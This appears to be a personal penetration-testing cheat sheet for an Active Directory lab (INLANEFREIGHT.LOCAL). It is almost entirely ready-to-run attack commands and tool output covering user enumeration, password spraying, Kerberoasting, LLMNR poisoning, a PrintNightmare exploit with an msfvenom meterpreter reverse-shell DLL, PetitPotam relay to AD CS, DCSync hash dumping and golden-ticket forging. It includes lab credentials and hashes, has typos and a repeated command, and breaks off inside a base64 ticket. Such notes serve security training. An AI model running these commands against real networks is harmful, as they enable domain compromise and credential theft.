# Enumeration

### **Kerbrute**  

[Kerbrute](https://github.com/ropnop/kerbrute) can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. The list of possible users come from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames).

```bash
 sudo kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/statistically-likely-usernames/jsmith.txt -o /htb/AD/inlanefreight/dc_user_enum
```


## Enum users trough SMB null session


### Crackmapexec 

To enum users  
```bash
crackmapexec smb 172.16.5.5 -u '' -p '' --users
```


To enum groups

```bash
crackmapexec smb 172.16.5.5 -u '' -p '' --grousp
```

To enum shares

```bash
crackmapexec smb 172.16.5.5 -u '' -p '' --shares
```

### **Spider**  

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```


### **Bloodhunt**
```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

### **rpcclient**

```bash
rpcclient -U "" -N 172.16.5.5
```

Query to retrieve information about specific RID. The decimal RID must be converted in hexadecimal  
```bash
queryuser <Hex:RID>
```


Query to enum users and groups in a domain  

```bash
#Enum groups
enumdomgroups

#Enum users
enumdomusers
```

### **enum4linux**  

```bash
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

## Trust Enumeration

## Build-in tool Get-ADTrust  
We can use the [Get-ADTrust](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=windowsserver2022-ps) cmdlet to enumerate domain trust relationships. This is especially helpful if we are limited to just using built-in tools.

```bash
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *
```

 - If `IntraForest` property is set to true means that is a child domain

 - If `ForestTransitive` property is set to true means that is forest trust

## PowerView - Get-DomainTrust  

Aside from using built-in AD tools such as the Active Directory PowerShell module, both PowerView and BloodHound can be utilized to enumerate trust relationships, the type of trusts established, and the authentication flow. After importing PowerView, we can use the [Get-DomainTrust](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainTrust/) function to enumerate what trusts exist, if any.  

```bash
PS C:\htb> Get-DomainTrust
```

## PowerView - Get-DomainTrustMapping

PowerView can be used to perform a domain trust mapping and provide information such as the type of trust (parent/child, external, forest) and the direction of the trust (one-way or bidirectional). This information is beneficial once a foothold is obtained, and we plan to compromise the environment further.

```bash
PS C:\htb> Get-DomainTrustMapping
```

## Checking Users in the Child Domain using Get-DomainUser

```bash
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

## Netdom - Query Domain Trust  

```bash
netdom query /domain:inlanefreight.local trust
```

## Netdom - Query Domain Controllers

```bash
netdom query /domain:inlanefreight.local trust
```

## Netdom - Query Domain Workstations and servers

```bash
netdom query /domain:inlanefreight.local workstation
```

## BloodHunt -Visualizing Trust Relationships
We can also use BloodHound to visualize these trust relationships by using the `Map Domain Trusts` pre-built query. Here we can easily see that two bidirectional trusts exist.   ![](https://remnote-user-data.s3.amazonaws.com/sCIijMssx6a9TWAlGYk-7HcY6RkMV1HuXL6nZ0Dh65YNBTQhcvpOCGK0rW4lFuMMRnRK2dEJmG_wQEC0K8uMdy_SQm4qBPivwPjFFxEjx6Kro1XfuXf_5iKAWx_9SHyi.png)

## ACL Enumeration

Access Control List  (ACL) is a list of Access Control Entrie (ACE) that take care the access of a specific reasourse for a specific group/user. To learn more go to [Access Control List Overview]() module

### PowerView  

The first thing is convert the name of the target in SID

```bash
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
```

- Now we can use **Get-DomainObjectAcl** and filter by **$sid**

```bash
Get-DomainObjectAcl -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

We can google the ObjectAceType guid or use the **ResolveGUIDs** flags

```bash
Get-DomainObjectAcl -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose
```

In the example we cann we have "**User-Force-Change-Password**" right on **Amundsen** user

To enumerate rights for a specific object in AD

```bash
Get-DomainObjectACL -ResolveGUIDs -Identity "GPO MANAGEMENT" | ? {$_.SecurityIdentifier -eq $sid} -Verbose
```

## Create a List of Accounts  

In case of powerview dosent work we can obtain the same result with [Get-Acl](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2) and [Get-ADUser](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps) cmdlets  

**Get-ADUser**

```bash
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```
**Get-Acl**
after do that we can use foreach and execute get-acl  for each user in the list

```bash
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

```

## Bloodhunt

To enumerate the dc on windows machine we can use **sharpHunt.exe**.

```bash
SharpHound.exe -c all --zipfilename sharphunt.zip
```

After import the zip file on the bloodhunt GUI we can search the thart user, in this exampe **forend**
 ![](https://remnote-user-data.s3.amazonaws.com/XczuPNf0InnF3LUv6e7ZYn-8peMfq6pfC_aSVLpeAGA3v6L82kRHU9ZWUyVU2OVQIStW4iO-G4MDdFLSmQzlV4H_VAMN0un_V1M_MEW5UFJMFCuX4VaS2tptB2-b3QEF.png)


Now go in the node info taband navigate in the **OUTBOUND CONTROL RIGHTS**
 ![](https://remnote-user-data.s3.amazonaws.com/az6LnOj1awc9VvODUoG12o0Hl0993sh8fH-rUxfz2KjAJfoPAfkzeWWVNeQb39FM-9Rb-W_hD8cYNH6p9jq8hDP4m1u0qMIr_5wHUXBbTcOuvVHKbZBzsrKSN_BSfWYz.png)


## LDAP - Enums
### LDAP - Anonymous authentication
Check if the LDAP service allow anonymous authentication
```bash
ldapsearch -H LDAP://10.129.211.144 -x -s base namingcontexts
```
The `namingcontexts` attribute lists the **base Distinguished Name (DNs)** of all **naming contexts** that the LDAP server knows about.

Think of naming context as **entry point or "root containers"** in the LDAP directory tree where different categories of data are stored. Each one represents different **subtree** of the directory
### LDAP - Users
```powershell
Get-ADObject -LDAPFilter '(&(objectCategory=person)(objectClass=user))' | select name
```
### LDAP - Groups
```powershell
Get-ADObject -LDAPFilter '(objectClass=group)' | select name
```
### LDAP - All domain controllers
```powershell
Get-ADObject -LDAPFilter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))' | select name
```
### LDAP - Count
```powershell
Get-ADObject -LDAPFilter '(objectClass=group)' -Properties * | Measure-Object | Select-Object -ExpandProperty Count
```


# ACL Abuse

## Create cred object

```bash
$wleyPWD = ConvertTo-SecureString 'transporter@4' -AsPlaintext -Force

$wleyCred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $wleyPWD)
```

## Chage the password

Use `Set-DomainUserPassword` to abuse the **GenericWrite ACL**

```bash
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPWD -Credential $wleyCred -Verbose
```

## Check Memeber of this group

With `Get-ADGroup` we can check the memebers of the group

```bash
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

## Add member in a group PowerView  

```bash
Add-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $damCred -Verbose

```

## Set fake SPN with PowerView

Set up a fake SPN allow us to performa kerberoasting attack. To do that read the [kerberoasting section](AD%20Cheat%20Sheet/Kerberoasting%20Attack.md)

```bash
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

```

# Password Policies Enumeration  

### **Enum4lin-ng**

```bash
enum4linux-ng -P 172.16.5.5  -oA domain_policies
```

### **Rpcclient**

```bash
rpcclient -U "" -N 172.16.5.5
```

## Query to enum informatio about domain users

```bash
rpcclient $> querydominfo
Domain:         INLANEFREIGHT
Server:
Comment:
Total Users:    3509
Total Groups:   0
Total Aliases:  203
Sequence No:    1
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
rpcclient $>
```

## Query to enum information about password policy
```bash
rpcclient $> getdompwinfo

min_password_length: 8
password_properties: 0x00000001 DOMAIN_PASSWORD_COMPLEX

rpcclient $>
```

# Poisoning LLMNR/NBT-NS

### Responder

Responder is a tool to posoning the response of LLMNR, NBT-NS protocols and more.. To more info read the[LLMNR/NTBT-NS Posoning](/o/g0p0AXIcTGvekdHmMoP7/s/EO0prAlimX7L2WsQXW17/sniffing-out-of-foothold/llmnr-nbt-ns-poisoning-from-linux).
Analysis mode

With **-A** (Analysis) flag we are able to **only listen the netwok** without performing a poisoning request

```bash
sudo responder -I ens244 -A
```

**Poisoning mode**  

```bash
sudo responder -I ens244
```

```bash
sudo responder -I ens24 -wrfv
```

- `-I`: indicate which network interface we'll be use
- `-w`: Start the WPAD rogue proxy server. Default value is Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port)
- `-r`: Enable answers for **netbios** wredir suffix queries. Answering to wredir will likely break stuff on the network. Default: False
- `-f`: `--fingerprint` This option allows you to fingerprint a host that
- `-v`: Increase verbosity of log

### **Inveight**  

retrieve all NTLMv2 unique hash
```bash
GET NTLMV2UNIQUE
```

retrieve all hash users's founded

```bash
GET NTLMV2USERNAMES
```

# Users Enumeration With Credentials  

### Crackmapexec

To enum grousp

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

```

To enum users  

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

```

To enum logged on users  

```bash
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-user

```

To enum shares

```bash

sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

```

**Spider plus**

Splider_plus is a module of **crackmapexec **that able to us enum all directories. This module generate a .json file that contain all file information founded.  

```bash

sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share "ZZZ_archive"

```


### Bloodhunt  

Bloodhut it's a tool for automatic enumeration. When enumeration is complited they are generate .**json** file that contain the enum infromatio. Its possible to pass this file to the GUI of bloodhunt to have a graphic view and it possible too query the information trought [**cypher language**](https://neo4j.com/docs/cypher-manual/current/introduction/).  

Start enumeration  
```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all

```

comperss all json file in a zip file  
```bash
zip -r AD_information.zip *.json
```

start neo4j service  
```bash
sudo neo4j start
```

start **bloodhunt GUI** 
```bash
bloodhunt
```

Now import the zip file in the GUI.

In this example i'have used the "**Find Shortest Path to Domain Admins**" built-in cypher query

![](https://remnote-user-data.s3.amazonaws.com/oPEL-6SWUTvf0ctayC_3q_93ar3POn9K3KtpGEHLoPXhL5x6XaTKm3F0MJDmxxrDD3LlXLYD9aP0HvrnGQD1HnEi-IQNE0Dnphox0K7Cvi0D7A56pivSekKYS8D6f9DF.png)

## SharpHunt


```bash
.\SharpHound.exe -c all --zipfilename sharphunt.zip
```

# Password Spray Attack  


## Linux

### Crackmapexec

the list  user format must be `DOMAIN\user`

```bash
sudo crackmapexec smb 172.16.5.5 -u filtered_users.txt  -p Welcome1 | grep +


# Exampf filtered response

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sgage:Welcome

```

### Kerbrute  

This work only for kerberos account  

```bash
sudo kerbrute passwordspray -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 --safe -t 50 user.txt Welcome1

```

### Rpcclient  


```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

## Windows  

### DomainPasswordSpray.ps1

first import the module
```bash
Import-Module .\DomainPasswordSpray.ps1
```

PasswordSpray through all users detect by `DomainPasswordSpray`
```bash
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

```

# Kerberoasting Attack

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts. **SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. **

Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\LOCAL SERVICE`. **Any domain user can request a Kerberos ticket for any service account in the same domain.** This is also possible across forest trusts if authentication is permitted across the trust boundary.

> NOTE
> 
> All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

## Linux  

### GetUserSPNs.py  

- Command to enumerate all SPN accounts

To enumerate all SPN account we need a valid credetial for a users in a domain  
```bash
sudo GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/sqldev

```

To retrieve TGS ticket add the `-request` flag, and save it in the output file with `outpufile` flag  

```bash
sudo GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/sqldev -request -outpufile sqldev_tgs

```

To retrieve TGS tick for a specific users use the `-request-user` flag. To crack the TGS with [hashcat look this example](/o/g0p0AXIcTGvekdHmMoP7/s/EO0prAlimX7L2WsQXW17/cheatsheet/ad-cheat-sheet#tgs-kerberos-ticker) 
```bash
sudo GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/sqldev -request-user SAPService -outputfile SAPService_tgs

```

## Windows


### Manual Method  

Load the TGS ticket in memory  
```bash
Add-Type -AssemblyName System.IdentityModel
```

```bash
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/inlanefreight.local"

```

extract ticket to the memory with mimikat in base64  

```bash
mimikatz # base64 /out:true

```

```bash
mimikatz # kerberos::list /export

```

decode the base64 file

```
cat encoded_file | base64 -d > vmware.kirbi

```

Now to extract the TGS ticket use this version of the kirbi2john.py  

```bash

python3 kirbi2john.py vmware.kirbi

```

Clear the output for hashcat format

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

To crack the TGS with [hashcat look this example](AD%20Cheat%20Sheet/Hashcat/TGS%20Kerberos%20Ticker.md)

### Powerview

First import the module  

```bash

Import-Module .\PowerView.ps

```

Retrieve all SPN account in the current domain


```bash

Get-DomainUser * -SPN | select samaccountname, serviceprincipalname

```
 
Now get a ticket using `Get-DomainSPNTicket` module and export in a csv file  

```bash

Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat

```

Trim the TGS result of Get-DomainSPNTicket in bash

```bash
tr -d '[:space:]' < svcsql_TGS >> trim_TGS.hash
```

To crack the TGS with [hashcat look this example](AD%20Cheat%20Sheet/Hashcat/TGS%20Kerberos%20Ticker.md)  

### Rubeus

The `nowrap` it help us to copy and paste the ticket easly

```powershell
.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap

```

To crack the TGS with [hashcat look this example](AD%20Cheat%20Sheet/Hashcat/TGS%20Kerberos%20Ticker.md)

# Privileged Access


## RDP access - Windows

```bash
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

## Enumarate local gropup for WINRM  - Windows


```
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

### Use Enter-PSSession to connect WINRM on windows machine

```bash

$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force

$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)

Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

```

## Use evil-winrm to connect WINRM - Linux

```bash
evil-winrm -i 10.129.201.234 -u forend

```

## SQL access through mssqlclient - Linux


```bash
mssqlclient.py INLANEFREIGHT/damundsen@172.16.5.150 -windows-auth
```

once we are connected typing **Help **we'll be show various options.

Execute **shell command** through mssqlclient. First enable the cmdshell

```bash
enable_xp_cmdshell
```

To Execute the command

```bash
xp_cmdshell whoami /priv
```

## CME dump auto log

with `‒lsa` its possible to dump in memory login password

```bash
sudo proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa
```

# Bloodhunt Raw query

Enumerate memeber with the ability to connect thorugh **WINRM** to the target

```bash
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

Enumerate account with the **SQL account** enable

```bash
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

```

# Workaround for double hop problem

## Evil-WinRM

To view a current ticket enable in the machine session use

```
*Evil-WinRM* PS C:\Users\backupadm\Documents> klist
```

Create a PSCredential object to execute Powerview command
```bash
PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
```
  
```bash
PS C:\Users\backupadm\Documents> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

```

  
```bash
PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname
```


## Register PSSession Configuration - Windows Machine

Registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) cmdlet.  

```bash
PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
```

after that restart the WinRm service with the command

```bash
PS C:\htb> Restart-Service WinRM

```

Now it's possible connect with Enter-PSSession using the new session created

```bash
PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess

```

## Access with RDP

If we can access trought RDP the double hop problem dosent occur. Check thsi with **klist**

```bash

C:\htb> klist

Current LogonId is 0:0x1e5b8b
Cached Tickets: (4)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL

	Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL

	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96

	Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize

	Start Time: 6/28/2022 9:13:38 (local)

	End Time:   6/28/2022 19:13:38 (local)

	Renew Time: 7/5/2022 9:13:38 (local)

	Session Key Type: AES-256-CTS-HMAC-SHA1-96

	Cache Flags: 0x2 -> DELEGATION

	Kdc Called: DC01.INLANEFREIGHT.LOCAL

#1>     Client: backupadm @ INLANEFREIGHT.LOCAL

	Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL

	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96

	Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize

	Start Time: 6/28/2022 9:13:38 (local)

	End Time:   6/28/2022 19:13:38 (local)

	Renew Time: 7/5/2022 9:13:38 (local)

	Session Key Type: AES-256-CTS-HMAC-SHA1-96

	Cache Flags: 0x1 -> PRIMARY

	Kdc Called: DC01.INLANEFREIGHT.LOCAL

#2>     Client: backupadm @ INLANEFREIGHT.LOCAL

	Server: ProtectedStorage/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL

	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96

	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize

	Start Time: 6/28/2022 9:13:38 (local)

	End Time:   6/28/2022 19:13:38 (local)

	Renew Time: 7/5/2022 9:13:38 (local)

	Session Key Type: AES-256-CTS-HMAC-SHA1-96

	Cache Flags: 0

	Kdc Called: DC01.INLANEFREIGHT.LOCAL

#3>     Client: backupadm @ INLANEFREIGHT.LOCAL

	Server: cifs/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL

	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96

	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize

	Start Time: 6/28/2022 9:13:38 (local)

	End Time:   6/28/2022 19:13:38 (local)

	Renew Time: 7/5/2022 9:13:38 (local)

	Session Key Type: AES-256-CTS-HMAC-SHA1-96

	Cache Flags: 0

	Kdc Called: DC01.INLANEFREIGHT.LOCAL
```

## External resource

as extranal resource to bypass this proble check this blog post:

- [Kerberos Double-Hop Workarounds](https://posts.slayerlabs.com/double-hop/)

# PrinterNightmare - Attack (CVE-2021-34527 and CVE-2021-1675)

`PrintNightmare` is the nickname given to two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution  

## Install cube0x0's Version of Impacket

For this exploit to work successfully, we will need to use cube0x0's version of Impacket

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

```bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

First to start, check if teh target have the **System Asynchronous Remote Protocol** and **System Remote Protocol enable**


```bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

## Generate and share meterpreter dll

generate a malicus dll

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

```

now share this dll with **smbserver.py**

```
sudo smbserver.py -smb2support CompData /tmp/CompData

```

setup the multi-handler with msfconsole

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
```

Now we can run the CVE-2021-1675 exploit

```bash
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

# PetitPotam (MS-EFSRPC) - Attack
PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an **LSA spoofing vulnerability** that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate.

First off, we need to start **ntlmrelayx.py** in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as certi to attempt to locate it.

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```


In another window, we can run the tool **PetitPotam.py**. We run this tool with the command `python3 PetitPotam.py <attack host IP> <Domain Controller IP> `to attempt to coerce the Domain Controller to authenticate to our host where **ntlmrelayx.py** is running.

```bash
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

If the PetitPotam attack success in the ntlmrelayx.py session we are able to take the **base64 certificate**

Next, we can take this base64 certificate and use **gettgtpkinit.py **to request a **Ticket-Granting-Ticket** (TGT) for the domain controller.

```bash
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 "$(cat certificate_base64)" dc01.ccache

```

Save the TGT in the **KRB5CCNAME** variable

```bash
export KRB5CCNAME=dc01.ccache
```

Now we can perform a DCSync Attack with the TGT and retrieve the NTL hash. In this case i have used **secretsdump.py**

```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

Confirming Admin Access to the Domain Controller

```bash
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

# ExtraSids Attack - Windows

This attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) property is respected due to a lack of [SID Filtering](https://web.archive.org/web/20220812183844/https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) protection  

To perform this attack after compromising a child domain, we need the following:

- The KRBTGT hash for the child domain

- The SID for the child domain

- The name of a target user in the child domain (does not need to exist!)

- The FQDN of the child domain.

- The SID of the Enterprise Admins group of the root domain.

- With this data collected, the attack can be performed with Mimikatz.

## Get hash for KRBTGT user - Mimikatz

We can achive this perfominga dcsync attack for the user krbtgt (who as responsable for signig TGT ticket on DC)

```bash
lsadump::dcsync /user:LOGISTICS\krbtgt
```

## Get SID for child domain - PowerView
```bash
PS C:\htb> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689

```

## Get SID for Enterprise Admins group - PowerView

```bash

PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

  

distinguishedname                                       objectsid                                    

-----------------                                       ---------                                    

CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519

```

## Creating a Golden Ticket with Mimikatz  


```bash

PS C:\htb> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM

-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session

```


## Creating a Golden Ticket with Rubeus


```bash

PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt



______        _                      

(_____ \      | |                    

_____) )_   _| |__  _____ _   _  ___

|  __  /| | | |  _ \| ___ | | | |/___)

| |  \ \| |_| | |_) ) ____| |_| |___ |

|_|   |_|____/|____/|_____)____/(___/



v2.0.2



[*] Action: Build TGT



[*] Building PAC



[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)

[*] SID            : S-1-5-21-2806153819-209893948-922872689

[*] UserId         : 500

[*] Groups         : 520,512,513,519,518

[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519

[*] ServiceKey     : 9D765B482771505CBE97411065964D5F

[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5

[*] KDCKey         : 9D765B482771505CBE97411065964D5F

[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5

[*] Service        : krbtgt

[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL



[*] Generating EncTicketPart

[*] Signing PAC

[*] Encrypting EncTicketPart

[*] Generating Ticket

[*] Generated KERB-CRED

[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'



[*] AuthTime       : 3/29/2022 10:06:41 AM

[*] StartTime      : 3/29/2022 10:06:41 AM

[*] EndTime        : 3/29/2022 8:06:41 PM

[*] RenewTill      : 4/5/2022 10:06:41 AM



[*] base64(ticket.kirbi):

doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVG

UkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5M

T0NBTKOCBDIwggQuoAMCARehAwIBA6KCBCAEggQc0u5onpWKAP0Hw0KJuEOAFp8OgfBXlkwH3sXu5BhH

T3zO/Ykw2Hkq2wsoODrBj0VfvxDNNpvysToaQdjHIqIqVQ9kXfNHM7bsQezS7L1KSx++2iX94uRrwa/S

VfgHhAuxKPlIi2phwjkxYETluKl26AUo2+WwxDXmXwGJ6LLWN1W4YGScgXAX+Kgs9xrAqJMabsAQqDfy

k7+0EH9SbmdQYqvAPrBqYEnt0mIPM9cakei5ZS1qfUDWjUN4mxsqINm7qNQcZHWN8kFSfAbqyD/OZIMc

